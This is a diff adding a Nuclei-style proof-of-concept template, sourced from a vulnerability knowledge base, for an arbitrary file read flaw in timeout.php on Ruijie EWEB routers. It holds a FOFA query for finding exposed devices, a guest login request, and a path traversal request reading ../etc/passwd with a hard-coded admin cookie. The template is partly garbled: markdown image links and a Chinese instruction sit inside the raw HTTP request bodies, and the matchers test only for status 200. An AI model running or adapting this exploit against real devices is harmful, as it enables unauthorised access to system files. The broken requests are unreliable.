@@ -1,0 +1,56 @@
+id: poc-zabwz6cgpt5ddfo1
+info:
+  name: 锐捷EWEB路由器timeout.php存在任意文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/zabwz6cgpt5ddfo1'
+  tags: lfi,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: zabwz6cgpt5ddfo1
+    fofa: title="锐捷网络-EWEB网管系统"
+http:
+- raw:
+  - 'POST /ddi/server/login.php HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    username=guest&password=guest?
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1746175144946-805ad385-2e85-4d95-bc49-ae52764906c7.png)
+
+    利用可用cookie访问接口'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'POST /system_pi/timeout.php?a=getFile HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+
+    Content-Length: 22
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Cookie: RUIJIEID=sgkh17phn774d4koqidko54pa4; user=admin
+
+    Accept-Encoding: gzip, deflate, br
+
+    Connection: keep-alive
+
+
+    fileName=../etc/passwd
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1746175145175-8121d9cd-58b8-4faa-bec2-5f613b50443d.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
